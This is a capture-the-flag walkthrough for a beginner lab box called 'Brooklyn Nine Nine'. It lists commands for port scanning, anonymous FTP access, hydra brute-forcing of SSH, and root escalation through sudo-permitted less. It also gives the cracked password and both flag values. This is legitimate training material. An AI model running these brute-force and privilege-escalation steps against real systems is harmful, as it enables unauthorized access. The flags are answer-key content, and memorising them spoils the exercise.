# Brooklyn Nine Nine

> This room is aimed for beginner level hackers but anyone can try to hack this box. There are two main intended ways to root the box.

<br>

Process:
- 1) scanning 
  - port scan: `nmap -T4 <ip>`
  - aggressive scan: `nmap -T4 -A -p 21,22,80`
- 2) check anonymous FTP login 
  - login: `ftp <ip>` -> [anonymous]
  - found: "note_to_jake.txt" -- indicating jake has weak password
- 3) try to brute force SSH
  - `hydra -l jake -P /usr/share/wordlists/rockyou.txt <ip> ssh`
  - found password: jake:987654321
- 4) login to SSH
  - `ssh jake@<ip>` -> [987654321]
- 5) find user flag 
  - `cat /home/holt/user.txt` = **ee11cbb19052e40b07aac0ca060c23ee**
- 6) find admin flag
  - see sudo privileges: `sudo -l` -- found: "/usr/bin/less"
  - get root flag: `sudo less /root/root.txt` = **63a9f0ea7bb98050796b649e85481845**